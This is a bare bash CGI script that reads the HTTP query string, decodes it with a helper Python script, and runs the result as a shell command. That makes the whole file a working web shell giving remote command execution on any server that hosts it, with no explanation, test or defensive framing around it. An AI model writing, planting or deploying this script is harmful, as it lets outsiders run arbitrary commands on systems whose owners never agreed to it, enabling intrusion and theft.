#!/bin/bash
echo 'Content-type:text/plain'
echo ''
command=`python3 decoder.py "$QUERY_STRING"`
bash -c "$command"


